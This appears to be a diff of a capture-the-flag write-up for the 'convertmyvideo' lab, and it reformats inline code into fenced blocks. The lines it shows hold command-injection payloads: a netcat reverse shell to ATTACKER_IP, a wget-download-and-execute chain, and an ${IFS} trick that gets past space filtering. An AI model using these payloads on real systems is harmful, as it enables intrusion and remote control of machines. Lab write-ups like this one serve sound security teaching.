@@ -104,7 +104,9 @@ Let's try injecting our own commands. We'll start off by trying to inject the `i
 
 Let's try a basic bypass using the `;` symbol: 
 
-`test;id;`
+```
+test;id;
+```
 
 ![screenshot8](../assets/images/convertmyvideo/screenshot8.png)
 
@@ -124,7 +126,9 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
 
 I then set up a simple HTTP server so that we can download the file onto the target machine. We can then inject the following commands into the web page:
 
-`test;wget http://ATTACKER_IP:8000/shell.sh;chmod +x shell.sh;./shell.sh;`
+```
+test;wget http://ATTACKER_IP:8000/shell.sh;chmod +x shell.sh;./shell.sh;`
+```
 
 This will have the target machine download our reverse shell script, make it executable, then execute it.
 
@@ -144,7 +148,9 @@ To bypass the space stripping, we can use `${IFS}` to replace the spaces.
 
 Now our payload becomes:
 
-`test;wget${IFS}http://ATTACKER_IP:8000/shell.sh;chmod${IFS}+x${IFS}shell.sh;./shell.sh;`
+```
+test;wget${IFS}http://ATTACKER_IP:8000/shell.sh;chmod${IFS}+x${IFS}shell.sh;./shell.sh;`
+```
 
 We send in the payload...
 
